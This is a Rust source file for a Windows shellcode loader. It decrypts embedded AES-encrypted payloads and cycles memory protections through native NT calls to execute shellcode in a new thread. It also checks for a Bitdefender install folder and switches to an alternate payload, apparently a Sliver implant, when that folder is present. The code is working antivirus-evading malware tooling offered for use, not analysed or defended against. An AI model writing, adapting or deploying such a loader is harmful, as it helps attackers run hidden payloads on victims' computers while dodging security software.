#![windows_subsystem = "windows"]
use aes::{Aes128};
use cfb_mode::Cfb;
use cfb_mode::cipher::{NewCipher, AsyncStreamCipher};
use windows::{Win32::System::Memory::*, Win32::System::SystemServices::*};
use ntapi::{ntmmapi::*, ntpsapi::*, ntobapi::*, winapi::ctypes::*};
use std::path::PathBuf;
use std::path::Path;

type Aes128Cfb = Cfb<Aes128>;

pub struct Injector {
    shellcode: Vec<u8>,
}

impl Injector {
    pub fn new(shellcode: Vec<u8>) -> Injector {
        Injector { shellcode }
    }

    pub fn run_in_current_process(&mut self) {
        unsafe {
            let mut protect = PAGE_NOACCESS.0;
            let mut map_ptr: *mut c_void = std::ptr::null_mut();
            // asking for more than needed, because we can afford it
            let mut sc_len = self.shellcode.len() * 5;
            NtAllocateVirtualMemory(NtCurrentProcess, &mut map_ptr, 0, &mut sc_len, MEM_COMMIT.0 | MEM_RESERVE.0, protect);
            NtProtectVirtualMemory(NtCurrentProcess, &mut map_ptr, &mut sc_len, PAGE_READWRITE.0, &mut protect);
            self.copy_nonoverlapping_gradually(map_ptr as *mut u8);
            NtProtectVirtualMemory(NtCurrentProcess, &mut map_ptr, &mut sc_len, PAGE_NOACCESS.0, &mut protect);
            NtProtectVirtualMemory(NtCurrentProcess, &mut map_ptr, &mut sc_len, PAGE_EXECUTE.0, &mut protect);
            let mut thread_handle : *mut c_void = std::ptr::null_mut();
            NtCreateThreadEx(&mut thread_handle, MAXIMUM_ALLOWED, std::ptr::null_mut(), NtCurrentProcess, map_ptr, std::ptr::null_mut(), 0, 0, 0, 0, std::ptr::null_mut());
            NtWaitForSingleObject(thread_handle, 0, std::ptr::null_mut());
        }
    }

    fn copy_nonoverlapping_gradually(&mut self, map_ptr: *mut u8) {
        unsafe {
            let sc_ptr = self.shellcode.as_ptr();
            let mut i = 0;
            while i < self.shellcode.len()+33 {
                std::ptr::copy_nonoverlapping(sc_ptr.offset(i as isize), map_ptr.offset(i as isize), 32);
                i += 32;
            }
        }
    }
}

const SHELLCODE_BYTES: &[u8] = include_bytes!("../shellcode.enc");
const SHELLCODE_BYTES2: &[u8] = include_bytes!("../file.enc");
//Comment the following line in order to use only one loader
const SHELLCODE_BYTES3: &[u8] = include_bytes!("../shellcode_sliv.enc");
const SHELLCODE_LENGTH: usize = SHELLCODE_BYTES.len();
const SHELLCODE_LENGTH2: usize = SHELLCODE_BYTES2.len();
//Comment the following line in order to use only one loader
const SHELLCODE_LENGTH3: usize = SHELLCODE_BYTES3.len();

#[no_mangle]
#[link_section = ".text"]
static SHELLCODE: [u8; SHELLCODE_LENGTH] = *include_bytes!("../shellcode.enc");
static SHELLCODE2: [u8; SHELLCODE_LENGTH2] = *include_bytes!("../file.enc");
//Comment the following line in order to use only one loader
static SHELLCODE3: [u8; SHELLCODE_LENGTH3] = *include_bytes!("../shellcode_sliv.enc");
static AES_KEY: [u8; 16] = *include_bytes!("../aes.key");
static AES_IV: [u8; 16] = *include_bytes!("../aes.iv");
//Comment the following two lines in order to use only one loader
static AES_KEY2: [u8; 16] = *include_bytes!("../aesSliv.key");
static AES_IV2: [u8; 16] = *include_bytes!("../aesSliv.iv");

fn decrypt_shellcode_stub() -> Vec<u8> {
    let mut cipher = Aes128Cfb::new_from_slices(&AES_KEY, &AES_IV).unwrap();
    let mut buf = SHELLCODE.to_vec();
    let mut _buf2 = SHELLCODE2.to_vec();
    cipher.decrypt(&mut buf);
    buf
	
}
  //Comment the following function in order to use only one loader
fn decrypt_shellcode_stub_sliv() -> Vec<u8> {
    let mut cipher = Aes128Cfb::new_from_slices(&AES_KEY2, &AES_IV2).unwrap();
    let mut buf = SHELLCODE3.to_vec();
    let mut _buf2 = SHELLCODE2.to_vec();
    cipher.decrypt(&mut buf);
    buf
	
}

fn main() {
    // Change this to the path of the directory you want to check
    //Comment the next line and the if function and uncomment the last two lines of code
    //to use only one loader
    let dir_path = PathBuf::from("C:\\Program Files\\Bitdefender");
  
    if Path::new(&dir_path).exists() && dir_path.is_dir() {
        let mut injector = Injector::new(decrypt_shellcode_stub_sliv());
        injector.run_in_current_process();
    } else {
        let mut injector = Injector::new(decrypt_shellcode_stub());
        injector.run_in_current_process();
    }
  
  //let mut injector = Injector::new(decrypt_shellcode_stub());
  //injector.run_in_current_process();
  
}
